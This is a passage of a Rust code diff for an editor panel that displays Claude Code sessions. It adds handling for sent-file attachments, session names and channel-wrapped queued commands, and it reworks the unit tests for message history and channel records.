+    ImageFormat::from_mime_type(&format!("image/{extension}"))
+}
+
+fn sent_file(attachment: &Value) -> Option<SentFile> {
+    let path = PathBuf::from(attachment.get("path").and_then(Value::as_str)?);
+    let name = match path.file_name() {
+        Some(name) => name.to_string_lossy().into_owned(),
+        None => path.to_string_lossy().into_owned(),
+    };
+    let media_type = attachment
+        .get("media_type")
+        .and_then(Value::as_str)
+        .map(|media_type| SharedString::from(media_type.to_string()));
+    // Both are consulted: `isImage` is absent from some deliveries, and a media type of
+    // `image/*` says the same thing.
+    let is_image = attachment
+        .get("isImage")
+        .and_then(Value::as_bool)
+        .unwrap_or(false)
+        || media_type
+            .as_ref()
+            .is_some_and(|media_type| media_type.starts_with("image/"));
+
+    Some(SentFile {
+        path,
+        name: SharedString::from(name),
+        size: attachment.get("size").and_then(Value::as_u64),
+        media_type,
+        is_image,
+    })
 }
 
 fn image_kind(block: &Value) -> EntryKind {
@@ -7488,7 +11276,16 @@ fn queued_command_prompt(record: &TranscriptRecord) -> Option<SharedString> {
 
     // Same rule as the conversation's own records: a queued `<task-notification>` is the
     // CLI telling itself a background command finished, not a message anyone typed.
-    user_visible_text(&prompt).map(SharedString::from)
+    let visible = user_visible_text(&prompt)?;
+    let source = match attachment
+        .get("origin")
+        .and_then(|origin| origin.get("kind"))
+        .and_then(Value::as_str)
+    {
+        Some(CHANNEL_ORIGIN) => channel_message_body(&visible),
+        _ => visible,
+    };
+    Some(SharedString::from(source))
 }
 
 /// The images pasted into a message that was queued behind a running turn.
@@ -7645,6 +11442,27 @@ fn collapsed_sessions_summary(session_count: usize, selected_name: Option<&str>)
         Some(name) => format!("{sessions} · {name}"),
         None => sessions,
     })
+}
+
+/// The name a session is shown under: the transcript's `ai-title` when one has been
+/// written, otherwise the registry name, otherwise the session id.
+fn preferred_session_name(session: &RegisteredSession, ai_title: Option<&str>) -> String {
+    preferred_name(
+        ai_title,
+        session.name.as_deref(),
+        session.session_id.as_str(),
+    )
+}
+
+fn preferred_name(ai_title: Option<&str>, registry_name: Option<&str>, session_id: &str) -> String {
+    if let Some(title) = ai_title.map(str::trim).filter(|title| !title.is_empty()) {
+        return title.to_string();
+    }
+    registry_name
+        .map(str::trim)
+        .filter(|name| !name.is_empty())
+        .unwrap_or(session_id)
+        .to_string()
 }
 
 /// What is left of a user record's text once the blocks Claude Code injected into it are
@@ -7960,6 +11778,23 @@ fn output_expansion_key(key: &SharedString) -> SharedString {
     SharedString::from(format!("{key}#output"))
 }
 
+/// The key one sent file's fetched image is held under. Derived from the entry's own key
+/// so that it survives a rebuild exactly as long as the entry does.
+/// The key the prompt file of a CLI dispatch card is read under. Derived from the entry
+/// rather than from the path, so that the read and the text it produces are dropped with
+/// the entry they belong to and are kept while it is on screen.
+fn dispatch_prompt_key(key: &SharedString) -> SharedString {
+    SharedString::from(format!("{key}#dispatch-prompt"))
+}
+
+fn dispatch_report_key(key: &SharedString) -> SharedString {
+    SharedString::from(format!("{key}#report"))
+}
+
+fn sent_file_key(key: &SharedString, file_index: usize) -> SharedString {
+    SharedString::from(format!("{key}#file-{file_index}"))
+}
+
 /// Whether the panel will read this path back.
 ///
 /// The path comes out of a file format that is private to Claude Code, so it is treated
@@ -8168,10 +12003,14 @@ fn decode_base64(input: &str) -> Option<Vec<u8>> {
 mod tests {
     use super::*;
 
-    use std::sync::Mutex;
+    use std::sync::{
+        Mutex,
+        atomic::{AtomicUsize, Ordering},
+    };
 
+    use crate::LiveMessage;
     use crate::SubagentMeta;
-    use crate::session_registry::{SessionSummary, TailProgress, TailState};
+    use crate::session_registry::{ChannelStatus, SessionSummary, TailProgress, TailState};
     use crate::session_source::SessionListing;
     use crate::session_store::REGISTRY_SCAN_TIMEOUT;
     use crate::transcript::parse_record;
@@ -8206,83 +12045,53 @@ mod tests {
         .to_string()
     }
 
-    /// The mode is read out of the CLI's own footer, which is the only place it is
-    /// written down: nothing in the transcript says which mode a session is answering
-    /// in.
-    #[test]
-    fn permission_mode_is_read_out_of_the_line_the_cli_writes_it_on() {
-        let screen = |footer: &str| format!("some conversation\n\n\u{2500}\u{2500}\n{footer}");
-
-        assert_eq!(
-            permission_mode(&screen(
-                "  \u{23f5}\u{23f5} auto mode on (shift+tab to cycle) \u{b7} \u{2190} for agents"
-            ))
-            .as_deref(),
-            Some("auto mode"),
-            "the glyphs and the trailing `on` are the line's, not the mode's name"
-        );
-        assert_eq!(
-            permission_mode(&screen("  \u{23f8} plan mode on (shift+tab to cycle)")).as_deref(),
-            Some("plan mode")
-        );
-        assert_eq!(
-            permission_mode(&screen(
-                "  \u{23f5}\u{23f5} bypass permissions on (shift+tab to cycle)"
-            ))
-            .as_deref(),
-            Some("bypass permissions"),
-            "a mode whose own name ends in `s` must not lose it with the trailing `on`"
-        );
+    /// The shape Claude Code writes for a message that arrived over the Zed channel.
+    fn channel_record_line(uuid: &str, content: &str) -> String {
+        serde_json::json!({
+            "parentUuid": "60e4f7a8-parent",
+            "isSidechain": false,
+            "type": "user",
+            "message": {
+                "role": "user",
+                "content": content,
+            },
+            "isMeta": true,
+            "uuid": uuid,
+            "timestamp": "2026-09-18T13:43:20.174Z",
+            "permissionMode": "auto",
+            "origin": {"kind": "channel", "server": "zed-claude"},
+            "promptSource": "system",
+            "queueSkipAttachments": true,
+            "userType": "external",
+            "entrypoint": "cli",
+            "sessionId": "1cd663f5-session",
+            "version": "2.1.276",
+        })
+        .to_string()
     }
 
-    #[test]
-    fn test_permission_mode_trims_trailing_whitespace_before_on() {
-        let screen = "some conversation\n\n\u{2500}\u{2500}\n  \u{23f5}\u{23f5} auto mode  on (shift+tab to cycle)";
-        assert_eq!(
-            permission_mode(screen).as_deref(),
-            Some("auto mode"),
-            "extra whitespace before `on` must not leave trailing spaces in the mode name"
-        );
+    fn channel_envelope(inner: &str) -> String {
+        format!(
+            "<channel source=\"zed-claude\" from=\"zed\" sent_at_ms=\"1789739000145\">\n{inner}\n</channel>"
+        )
     }
 
-    /// A screen with no such line is the ordinary mode, which the CLI announces by
-    /// saying nothing. Naming it here would be inventing a name Claude Code does not
-    /// use.
-    #[test]
-    fn permission_mode_is_unknown_when_the_screen_does_not_say_it() {
-        assert_eq!(permission_mode("").as_deref(), None);
-        assert_eq!(
-            permission_mode("\u{276f} \n\n  ? for shortcuts").as_deref(),
-            None
-        );
-    }
-
-    /// The conversation is mirrored on the same screen the footer is, so a message that
-    /// quotes the hint sits in the same text this reads. The footer is the last line to
-    /// carry it, and anything implausibly long for a mode name is not one.
-    #[test]
-    fn permission_mode_is_taken_from_the_footer_rather_than_the_conversation_above_it() {
-        let screen = concat!(
-            "  I pressed shift+tab and it said `old mode on (shift+tab to cycle)`, which\n",
-            "  is not what I expected at all when I was reading the manual for it\n",
-            "\u{2500}\u{2500}\n",
-            "  \u{23f5}\u{23f5} auto mode on (shift+tab to cycle)\n"
-        );
-        assert_eq!(
-            permission_mode(screen).as_deref(),
-            Some("auto mode"),
-            "the footer is the bottom-most line carrying the hint"
-        );
-
-        let only_a_long_quote = concat!(
-            "  the manual explains at some length that the line reads `whatever mode the ",
-            "session happens to be in on (shift+tab to cycle)` when it is on\n"
-        );
-        assert_eq!(
-            permission_mode(only_a_long_quote).as_deref(),
-            None,
-            "text far too long to be a mode name must not be shown as one"
-        );
+    fn entry_holds_channel_open(entry: &Entry) -> bool {
+        match &entry.kind {
+            EntryKind::Message { source, .. } => source.contains("<channel"),
+            EntryKind::SystemNote { text, .. } => text.contains("<channel"),
+            EntryKind::Unknown { label, raw } => {
+                label.contains("<channel") || raw.contains("<channel")
+            }
+            EntryKind::Queued { text } => text.contains("<channel"),
+            EntryKind::Pending { text, note, .. } => {
+                text.contains("<channel") || note.contains("<channel")
+            }
+            EntryKind::LocalCommand { text } => text.contains("<channel"),
+            EntryKind::SlashCommand { text } => text.contains("<channel"),
+            EntryKind::Thinking { source } => source.contains("<channel"),
+            _ => false,
+        }
     }
 
     /// What the session has spent is not what it is carrying: the context figure is the
@@ -8308,29 +12117,6 @@ mod tests {
             session_facts(&spend).contains(&SharedString::from("540K in \u{b7} 63K out")),
             "every kind of input counts towards what was read, got {:?}",
             session_facts(&spend)
-        );
-    }
-
-    /// The pane carries every strip the session has drawn, and the one being answered is
-    /// the last of them. Reading the first instead answers against a question the reader
-    /// settled turns ago, and draws the options of the wrong one.
-    #[test]
-    fn the_question_being_asked_is_the_last_strip_on_the_screen_not_the_first() {
-        let pane = concat!(
-            "\u{2190}  \u{2612} Architecture  \u{2612} Database  \u{2714} Submit  \u{2192}\n",
-            "\n",
-            "Which database should we use?\n",
-            "Claude answered: Postgres.\n",
-            "\n",
-            "\u{2190}  \u{2612} Project shape  \u{2610} Extras  \u{2714} Submit  \u{2192}\n",
-            "\n",
-            "Which extras should be on?\n"
-        );
-
-        assert_eq!(
-            question_being_asked(Some(pane), &[]),
-            1,
-            "the live strip has one question answered, and the settled one above it has two"
         );
     }
 
@@ -8446,289 +12232,6 @@ mod tests {
         );
     }
 
-    /// After the last question of a call is answered, Claude Code does not return the
-    /// answers — it draws every one of them back and asks whether to send them. Until
-    /// that is answered the call is still waiting, and the panel drew the last question
-    /// on: a reader looking at the panel had no button for the one thing the terminal
-    /// was waiting for.
-    #[test]
-    fn the_screen_that_asks_whether_to_send_the_answers_is_recognised() {
-        let review = concat!(
-            "Review your answers\n",
-            "\n",
-            "  \u{25cf} which extras?\n",
-            "    \u{2192} A, B\n",
-            "\n",
-            "Ready to submit your answers?\n",
-            "\n",
-            "\u{276f} 1. Submit answers\n",
-            "  2. Cancel\n"
-        );
-
-        assert!(answers_awaiting_confirmation(review));
-    }
-
-    /// Every other screen a session can be on must not be read as that one — a question
-    /// still being answered least of all, because drawing the confirmation over it would
-    /// send the call before the reader had chosen anything.
-    #[test]
-    fn no_other_screen_is_read_as_the_one_that_sends_the_answers() {
-        for screen in [
-            "",
-            "\u{276f} 1. [ ] A\n  2. [ ] B\n     Next\n",
-            // The words on their own, in something the session was saying.
-            "I will ask whether you are ready to submit your answers once I have them\n",
-            // The prompt without the rows: a screen part-way through being redrawn.
-            "Ready to submit your answers?\n",
-        ] {
-            assert!(
-                !answers_awaiting_confirmation(screen),
-                "{screen:?} was read as the confirmation screen"
-            );
-        }
-    }
-
-    /// A mention is the last `@` in the box with no whitespace after it. Read from the
-    /// caret instead, a reader who went back to fix a typo would open a menu over a
-    /// mention they had already picked.
-    #[test]
-    fn the_file_being_named_is_the_last_at_sign_in_the_box() {
-        assert_eq!(file_being_named("@"), Some(""));
-        assert_eq!(file_being_named("@src/pan"), Some("src/pan"));
-        assert_eq!(file_being_named("look at @src/pan"), Some("src/pan"));
-        assert_eq!(
-            file_being_named("@one.rs and @two"),
-            Some("two"),
-            "the one being typed is the last of them"
-        );
-    }
-
-    /// Whitespace ends a mention, and an `@` with a word in front of it is not one: an
-    /// email address in a message must not open a menu over what is being written.
-    #[test]
-    fn something_that_is_not_a_mention_opens_no_menu() {
-        assert_eq!(file_being_named(""), None);
-        assert_eq!(file_being_named("no mention here"), None);
-        assert_eq!(
-            file_being_named("@src/panel.rs is the one"),
-            None,
-            "a mention already picked is finished, and the space is what finished it"
-        );
-        assert_eq!(
-            file_being_named("mail user@example.com"),
-            None,
-            "an address is not a mention"
-        );
-    }
-
-    /// Picking one replaces the `@` being typed and nothing else in the box.
-    #[test]
-    fn picking_a_file_replaces_only_the_mention_being_typed() {
-        assert_eq!(
-            message_with_mention("look at @src/pan", "src/panel.rs").as_deref(),
-            Some("look at @src/panel.rs "),
-            "what was typed before it stays, and the space finishes it"
-        );
-        assert_eq!(
-            message_with_mention("@one.rs and @tw", "two.rs").as_deref(),
-            Some("@one.rs and @two.rs "),
-            "a mention already picked is not touched"
-        );
-    }
-
-    fn command_named(name: &str, argument_hint: Option<&str>) -> SlashCommand {
-        SlashCommand {
-            name: name.to_string(),
-            description: None,
-            argument_hint: argument_hint.map(str::to_string),
-            scope: SlashCommandScope::Builtin,
-        }
-    }
-
-    /// Up and Down belong to the menu while it is open. They walk the messages already
-    /// sent when it is not — and a reader picking a command with the arrow keys, which
-    /// is how every other menu is picked, would otherwise find their half-typed command
-    /// replaced by something they sent an hour ago.
-    #[test]
-    fn the_arrow_keys_walk_the_commands_menu_while_it_is_open() {
-        let offered = 3;
-
-        assert_eq!(step_through_menu(0, offered, MenuStep::Down), 1);
-        assert_eq!(step_through_menu(1, offered, MenuStep::Up), 0);
-    }
-
-    /// Held rather than wrapped at both ends: a menu that jumps from the last row to the
-    /// first reads as having lost the keypress.
-    #[test]
-    fn walking_past_either_end_of_the_menu_stays_where_it_is() {
-        assert_eq!(step_through_menu(0, 3, MenuStep::Up), 0);
-        assert_eq!(step_through_menu(2, 3, MenuStep::Down), 2);
-    }
-
-    /// The menu shrinks as the name is typed out, and the row that was highlighted can
-    /// be past the end of what is left. Reading it as-is would highlight nothing and
-    /// Enter would complete nothing.
-    #[test]
-    fn a_highlight_past_the_end_of_the_menu_falls_on_its_last_row() {
-        assert_eq!(step_through_menu(7, 2, MenuStep::Stay), 1);
-        assert_eq!(step_through_menu(7, 2, MenuStep::Up), 0);
-        assert_eq!(step_through_menu(7, 1, MenuStep::Down), 0);
-    }
-
-    /// Enter completes what is half-typed, and sends what is whole. Completing an
-    /// already-whole command would cost a second Enter for every command that takes no
-    /// arguments, and sending a half-typed one would send a command that does not exist.
-    #[test]
-    fn enter_completes_a_half_typed_command_and_sends_a_whole_one() {
-        let compact = command_named("compact", None);
-
-        assert_eq!(
-            enter_in_slash_menu("/comp", &compact),
-            EnterInMenu::Complete("compact".to_string())
-        );
-        assert_eq!(enter_in_slash_menu("/compact", &compact), EnterInMenu::Send);
-    }
-
-    /// A command that takes arguments is not whole when its name is: the reader has
-    /// still to type what it is about, so Enter fills the name in and leaves them there.
-    #[test]
-    fn enter_on_a_command_that_takes_arguments_completes_its_name() {
-        let goal = command_named("goal", Some("<what to aim for>"));
-
-        assert_eq!(
-            enter_in_slash_menu("/goal", &goal),
-            EnterInMenu::Complete("goal".to_string()),
-            "the name alone is not the whole command when it takes something after it"
-        );
-    }
-
-    fn question_named(header: &str, asked: &str) -> Question {
-        Question {
-            header: header.to_string(),
-            question: asked.to_string(),
-            options: Vec::new(),
-            multi_select: false,
-        }
-    }
-
-    /// The strip of marks scrolls: on a narrow window the terminal draws the arrows and
-    /// only as many questions as fit, so the marks say the first question is being asked
-    /// while the third one is on screen. Counting them showed the reader the options of a
-    /// question they had answered two questions ago — and widening the window "fixed" it,
-    /// which is how the strip gave itself away.
-    #[test]
-    fn the_question_being_asked_is_read_from_its_text_not_from_the_strip_that_scrolls() {
-        let questions = [
-            question_named(
-                "\u{8a9e}\u{7cfb}",
-                "\u{8981}\u{51fa}\u{54ea}\u{4e9b}\u{8a9e}\u{7cfb}？",
-            ),
-            question_named(
-                "\u{7247}\u{578b}",
-                "\u{7247}\u{578b}\u{600e}\u{9ebc}\u{6392}？",
-            ),
-            question_named(
-                "\u{7d20}\u{6750}",
-                "\u{7d20}\u{6750}\u{4f86}\u{6e90}\u{600e}\u{9ebc}\u{53d6}？",
-            ),
-        ];
-
-        let narrow = concat!(
-            "\u{2190}  \u{2612} \u{8a9e}\u{7cfb}  \u{2192}\n",
-            "\n",
-            "\u{7d20}\u{6750}\u{4f86}\u{6e90}\u{600e}\u{9ebc}\u{53d6}？\n",
-            "\n",
-            "  1. [ ] \u{6cbf}\u{7528}\u{73fe}\u{6709}\u{7d20}\u{6750}\u{5eab}\n"
-        );
-
-        assert_eq!(
-            question_being_asked(Some(narrow), &questions),
-            2,
-            "the third question's text is on screen, whatever the strip had room to draw"
-        );
-    }
-
-    /// The terminal wraps a question to the width it has, and breaks mid-sentence when
-    /// the text has no spaces to break at. A match that needs the line intact reads a
-    /// wrapped question as absent and falls back to the marks that are wrong.
-    #[test]
-    fn a_question_wrapped_across_lines_is_still_the_one_being_asked() {
-        let questions = [
-            question_named("a", "first question"),
-            question_named(
-                "b",
-                "\u{7d20}\u{6750}\u{4f86}\u{6e90}\u{600e}\u{9ebc}\u{53d6}\u{5f97}\u{6bd4}\u{8f03}\u{5feb}",
-            ),
-        ];
-        let wrapped = concat!(
-            "\u{2190}  \u{2612} a  \u{2192}\n",
-            "\u{7d20}\u{6750}\u{4f86}\u{6e90}\u{600e}\n",
-            "\u{9ebc}\u{53d6}\u{5f97}\u{6bd4}\u{8f03}\u{5feb}\n"
-        );
-
-        assert_eq!(question_being_asked(Some(wrapped), &questions), 1);
-    }
-
-    /// The questions already answered are above the one being asked, so the text of an
-    /// earlier one is on the same screen. The lowest is the live one.
-    #[test]
-    fn an_earlier_questions_text_in_the_scrollback_is_not_the_one_being_asked() {
-        let questions = [
-            question_named("a", "which database?"),
-            question_named("b", "which extras?"),
-        ];
-        let pane = concat!(
-            "which database?\n",
-            "Claude answered: Postgres.\n",
-            "\u{2190}  \u{2612} a  \u{2610} b  \u{2192}\n",
-            "which extras?\n"
-        );
-
-        assert_eq!(question_being_asked(Some(pane), &questions), 1);
-    }
-
-    #[test]
-    fn a_question_that_is_a_suffix_of_another_does_not_steal_its_match() {
-        let questions = [
-            question_named("whole", "Which database?"),
-            question_named("suffix", "database?"),
-        ];
-
-        let actual = question_being_asked(Some("Which database?\n"), &questions);
-        assert_eq!(
-            actual, 0,
-            "the whole question is the text on screen; expected index 0, got index {actual}"
-        );
-    }
-
-    /// A pane carrying none of the questions' text falls back to the marks, which is
-    /// still better than answering the first question by default.
-    #[test]
-    fn a_pane_that_names_no_question_falls_back_to_the_marks() {
-        let questions = [question_named("a", "which database?")];
-        let pane = "\u{2190}  \u{2612} a  \u{2610} b  \u{2714} Submit  \u{2192}\nsomething else entirely\n";
-
-        assert_eq!(question_being_asked(Some(pane), &questions), 1);
-    }
-
-    /// The mode's name is what is left after the line's own grammar is taken off it, and
-    /// the CLI pads that line to the width of the screen.
-    #[test]
-    fn the_permission_mode_carries_none_of_the_lines_padding() {
-        for line in [
-            "  \u{23f5}\u{23f5} auto mode  on (shift+tab to cycle)",
-            "  \u{23f5}\u{23f5} auto mode   (shift+tab to cycle)",
-            "\u{23f5}\u{23f5}  auto mode on  (shift+tab to cycle)",
-        ] {
-            assert_eq!(
-                permission_mode(line).as_deref(),
-                Some("auto mode"),
-                "{line:?} was read as {:?}",
-                permission_mode(line)
-            );
-        }
-    }
-
     /// A session that has not answered yet has spent nothing, and a zero says less than
     /// nothing at all.
     #[test]
@@ -8750,28 +12253,65 @@ mod tests {
             .collect()
     }
 
-    /// The history is the reader's own messages in the conversation, newest first, which
-    /// is the order Up walks them in.
     #[test]
-    fn the_history_is_the_readers_own_messages_newest_first() {
-        let entries = entries_of(&[
-            &user_message_line("u1", "first"),
-            &serde_json::json!({
-                "type": "assistant",
-                "uuid": "a1",
-                "message": { "content": [{"type": "text", "text": "an answer"}] },
-            })
-            .to_string(),
-            &user_message_line("u2", "second"),
-            &user_message_line("u3", "second"),
-            &user_message_line("u4", "third"),
-        ]);
+    fn history_includes_pending_and_slash_commands_without_consecutive_duplicates() {
+        let lines = [
+            chained_line(
+                USER_RECORD_TYPE,
+                "u1",
+                None,
+                false,
+                serde_json::json!("first"),
+            ),
+            chained_line(
+                USER_RECORD_TYPE,
+                "u2",
+                Some("u1"),
+                false,
+                serde_json::json!("<command-name>/compact</command-name>"),
+            ),
+            chained_line(
+                USER_RECORD_TYPE,
+                "u3",
+                Some("u2"),
+                false,
+                serde_json::json!("<command-name>/compact</command-name>"),
+            ),
+        ];
+        let mut transcript = crate::Transcript::new();
+        transcript.absorb(lines.iter().map(|line| record(line)));
+        let mut pending_sends = PendingSends::default();
+        pending_sends.remember("session", "pending", &[]);
 
         assert_eq!(
-            message_history(&entries),
-            history_of(&["third", "second", "first"]),
-            "the session's own answers are not the reader's history, and a message \
-             repeated back to back is one entry"
+            message_history(&pending_sends, &transcript),
+            history_of(&["pending", "/compact", "first"]),
+            "pending sends come first, slash commands are history, and consecutive repeats collapse"
+        );
+    }
+
+    /// A message still waiting in another conversation is not this one's history: those
+    /// rows are kept now that switching session hides them instead of dropping them, so
+    /// Up has to walk what was typed here and nothing else.
+    #[test]
+    fn history_leaves_out_messages_waiting_in_another_session() {
+        let lines = [chained_line(
+            USER_RECORD_TYPE,
+            "u1",
+            None,
+            false,
+            serde_json::json!("typed in this session"),
+        )];
+        let mut transcript = crate::Transcript::new();
+        transcript.absorb(lines.iter().map(|line| record(line)));
+        let mut pending_sends = PendingSends::default();
+        pending_sends.remember("other-session", "sent to the other conversation", &[]);
+        pending_sends.remember("this-session", "waiting here", &[]);
+
+        assert_eq!(
+            message_history_for(&pending_sends, &transcript, Some("this-session")),
+            history_of(&["waiting here", "typed in this session"]),
+            "Up offers this conversation's messages, never another session's pending row"
         );
     }
 
@@ -8870,181 +12410,6 @@ mod tests {
         assert_eq!(
             step_forward_through_history(&history, Some(9), ""),
             HistoryStep::MoveCursor(CursorDirection::Down)
-        );
-    }
-
-    /// The menu Claude Code draws for a question taking several answers, as measured
-    /// from a real one rather than assumed.
-    ///
-    /// The rows below the options are `Type something`, `Submit` and `Chat about this`.
-    /// A digit toggles its own row and leaves the cursor where it was — which is the
-    /// fact the first version of this got wrong. Down stops on the last row rather than
-    /// wrapping, and Up from the first row wraps to the last numbered row.
-    struct SeveralChoicesMenu {
-        option_count: usize,
-        cursor: usize,
-        ticked: HashSet<usize>,
-        activated: Option<usize>,
-    }
-
-    impl SeveralChoicesMenu {
-        fn new(option_count: usize, cursor: usize) -> Self {
-            Self {
-                option_count,
-                cursor,
-                ticked: HashSet::default(),
-                activated: None,
-            }
-        }
-
-        /// `Type something` is the row after the options, and is numbered like them.
-        fn last_numbered_row(&self) -> usize {
-            self.option_count
-        }
-
-        fn submit_row(&self) -> usize {
-            self.option_count + 1
-        }
-
-        /// The options, `Type something`, `Submit`, and `Chat about this`.
-        fn rows(&self) -> usize {
-            self.option_count + 3
-        }
-
-        fn toggle(&mut self, row: usize) {
-            if !self.ticked.remove(&row) {
-                self.ticked.insert(row);
-            }
-        }
-
-        fn press(&mut self, key: PaneKey) {
-            match key {
-                PaneKey::Choice(_) => {
-                    let row: usize = key
-                        .tmux_name()
-                        .parse::<usize>()
-                        .expect("a choice is sent as its digit")
-                        - 1;
-                    assert!(
-                        row <= self.last_numbered_row(),
-                        "the menu has no row {}, so the digit for it answers nothing",
-                        row + 1
-                    );
-                    self.toggle(row);
-                }
-                PaneKey::Down => self.cursor = (self.cursor + 1).min(self.rows() - 1),
-                PaneKey::Up => {
-                    self.cursor = self
-                        .cursor
-                        .checked_sub(1)
-                        .unwrap_or(self.last_numbered_row())
-                }
-                PaneKey::Enter => self.activated = Some(self.cursor),
-                other => panic!("the menu was sent {other:?}, which is not one of its keys"),
-            }
-        }
-
-        fn play(&mut self, keys: &[PaneKey]) {
-            for key in keys {
-                self.press(*key);
-            }
-        }
-    }
-
-    /// The property the whole sequence turns on: a digit does not move the cursor, so
-    /// where the walk to `Submit` starts is not knowable from the ticks. Counting rows
-    /// from the last ticked option put `Enter` on whatever row it happened to reach —
-    /// ticking an option the reader never chose, or opening `Type something`.
-    #[test]
-    fn submitting_several_choices_reaches_submit_from_wherever_the_cursor_was() {
-        let option_count = 4;
-        let ticked: HashSet<usize> = HashSet::from_iter([0, 1]);
-        let keys = keys_for_several_choices(&ticked, option_count)
-            .expect("two ticked options are an answer");
-
-        for starting_cursor in 0..option_count + 3 {
-            let mut menu = SeveralChoicesMenu::new(option_count, starting_cursor);
-            menu.play(&keys);
-
-            assert_eq!(
-                menu.activated,
-                Some(menu.submit_row()),
-                "starting on row {starting_cursor}, Enter landed on row {:?} rather than \
-                 Submit on row {}",
-                menu.activated,
-                menu.submit_row()
-            );
-            assert_eq!(
-                menu.ticked, ticked,
-                "starting on row {starting_cursor}, the answer submitted was {:?} rather \
-                 than the {:?} that were ticked",
-                menu.ticked, ticked
-            );
-        }
-    }
-
-    /// The same holds for one tick and for every option ticked: neither end of the
-    /// menu is a special case the walk gets right by luck.
-    #[test]
-    fn submitting_reaches_submit_for_any_set_of_ticks() {
-        for option_count in 1..=5 {
-            for ticks in [vec![0], vec![option_count - 1], (0..option_count).collect()] {
-                let ticked: HashSet<usize> = ticks.iter().copied().collect();
-                let keys = keys_for_several_choices(&ticked, option_count)
-                    .expect("a ticked option is an answer");
-
-                let mut menu = SeveralChoicesMenu::new(option_count, 0);
-                menu.play(&keys);
-                assert_eq!(
-                    menu.activated,
-                    Some(menu.submit_row()),
-                    "with {option_count} options and {ticks:?} ticked, Enter landed on \
-                     {:?} rather than Submit on row {}",
-                    menu.activated,
-                    menu.submit_row()
-                );
-                assert_eq!(menu.ticked, ticked);
-            }
-        }
-    }
-
-    /// `Type something` is one more numbered row in a menu that takes several answers,
-    /// so its digit only ticks it: the box to type in opens when the answer is
-    /// submitted. Sending the digit alone leaves the reader with a ticked row and
-    /// nowhere to type.
-    #[test]
-    fn typing_an_answer_to_a_several_choices_question_submits_the_row_rather_than_ticking_it() {
-        let option_count = 3;
-        let already_ticked: HashSet<usize> = HashSet::from_iter([0]);
-        let keys = keys_for_own_words(&already_ticked, option_count, true)
-            .expect("typing is always an answer");
-
-        let mut menu = SeveralChoicesMenu::new(option_count, 0);
-        menu.play(&keys);
-
-        assert_eq!(
-            menu.activated,
-            Some(menu.submit_row()),
-            "Enter landed on {:?} rather than Submit on row {}",
-            menu.activated,
-            menu.submit_row()
-        );
-        assert_eq!(
-            menu.ticked,
-            HashSet::from_iter([0, option_count]),
-            "what is submitted must be the ticks the reader made plus `Type something`"
-        );
-    }
-
-    /// A question taking one answer is a different menu: the digit is the whole answer,
-    /// and `Type something` opens the box outright.
-    #[test]
-    fn typing_an_answer_to_a_single_choice_question_is_one_keypress() {
-        let option_count = 3;
-        assert_eq!(
-            keys_for_own_words(&HashSet::default(), option_count, false),
-            keys_for_single_choice(option_count),
-            "nothing is ticked and nothing is walked past in a menu taking one answer"
         );
     }
 
@@ -9394,30 +12759,34 @@ mod tests {
         );
     }
 
-    /// The two figures count different things — an answer's is the whole request, a
-    /// compaction's is the conversation it kept — so the jump from one to the other has to
-    /// be explained where it is shown or it reads as the panel having been wrong.
+    /// Context size now sits in the meter, and a compaction is explained in that
+    /// meter's tooltip rather than as a "94K ctx" fact.
     #[test]
     fn a_context_read_from_a_compaction_says_so() {
         let measured = Spend {
             context_tokens: 94_578,
             ..Default::default()
         };
+        let meter = context_meter(None, &measured, false).expect("a measured context is shown");
         assert!(
-            session_facts(&measured).contains(&SharedString::from("94K ctx")),
-            "a measured context is stated plainly: {:?}",
-            session_facts(&measured)
+            meter.label.as_ref().contains("ctx"),
+            "without a window the meter is a number only: {:?}",
+            meter.label
         );
+        assert_eq!(meter.tooltip, None);
 
         let compacted = Spend {
             context_tokens: 14_846,
             context_is_post_compaction: true,
             ..Default::default()
         };
+        let meter = context_meter(None, &compacted, false).expect("a compacted context is shown");
         assert!(
-            session_facts(&compacted).contains(&SharedString::from("14K ctx (compacted)")),
-            "and one left by a compaction is marked: {:?}",
-            session_facts(&compacted)
+            meter.tooltip.as_deref().is_some_and(
+                |tooltip| tooltip.contains("(compacted)") || tooltip.contains("compaction")
+            ),
+            "compaction is explained on the meter: {:?}",
+            meter.tooltip
         );
     }
 
@@ -9710,8 +13079,96 @@ mod tests {
         );
     }
 
+    /// Verbatim attachment Claude Code writes when a channel message arrives mid-turn.
+    /// Origin is nested under `attachment.origin`, not at the record top level.
+    const QUEUED_CHANNEL_CLEAR_ATTACHMENT: &str = r#"{"parentUuid":"3dae0f7f-...","isSidechain":false,"attachment":{"type":"queued_command","prompt":"<channel source=\"zed-claude\" from=\"zed\" sent_at_ms=\"1789805279902\">\n/clear\n</channel>","source_uuid":"796c722f-...","commandMode":"prompt","origin":{"kind":"channel","server":"zed-claude"},"timestamp":"2026-09-19T08:07:59.904Z","isMeta":true},"type":"attachment","uuid":"413be2e5-...","timestamp":"2026-09-19T08:07:59.904Z","sessionId":"0c6c5530-...","version":"2.1.276"}"#;
+
     #[test]
-    fn attachments_collapse_into_one_section_at_the_top() {
+    fn queued_command_prompt_unwraps_a_channel_envelope_queued_while_busy() {
+        let record = record(QUEUED_CHANNEL_CLEAR_ATTACHMENT);
+        let prompt = queued_command_prompt(&record);
+        assert_eq!(
+            prompt.as_deref(),
+            Some("/clear"),
+            "a channel queued_command must be the inner text; got {:?}",
+            prompt.as_deref()
+        );
+    }
+
+    #[test]
+    fn a_pending_send_pairs_with_a_queued_channel_attachment() {
+        let typed = "/clear";
+        let mut pending_sends = PendingSends::default();
+        pending_sends.remember("session-a", typed, &[]);
+        let pending_before = pending_sends.entries();
+        assert_eq!(
+            pending_before.len(),
+            1,
+            "the send is drawn until the queued channel attachment arrives"
+        );
+        let pending_note_and_text = match &pending_before[0].kind {
+            EntryKind::Pending { note, text, .. } => format!("{note} / {text}"),
+            _ => "not a pending row".to_string(),
+        };
+
+        let after = user_message_entries_of(&[QUEUED_CHANNEL_CLEAR_ATTACHMENT]);
+        let compared = user_messages(&after);
+        pending_sends.pair_with(&after);
+
+        assert_eq!(
+            pending_sends.entries().len(),
+            0,
+            "the queued channel attachment is the send arriving; pending note and text: \
+             {pending_note_and_text}; compared against: {compared:?}"
+        );
+    }
+
+    #[test]
+    fn queued_command_prompt_keeps_a_channel_envelope_when_origin_is_not_channel() {
+        let envelope = "<channel source=\"zed-claude\" from=\"zed\" sent_at_ms=\"1789805279902\">\n/clear\n</channel>";
+
+        let without_origin = record(
+            &serde_json::json!({
+                "type": "attachment",
+                "uuid": "no-origin",
+                "attachment": {
+                    "type": "queued_command",
+                    "prompt": envelope,
+                },
+            })
+            .to_string(),
+        );
+        let without_origin_prompt = queued_command_prompt(&without_origin);
+        assert_eq!(
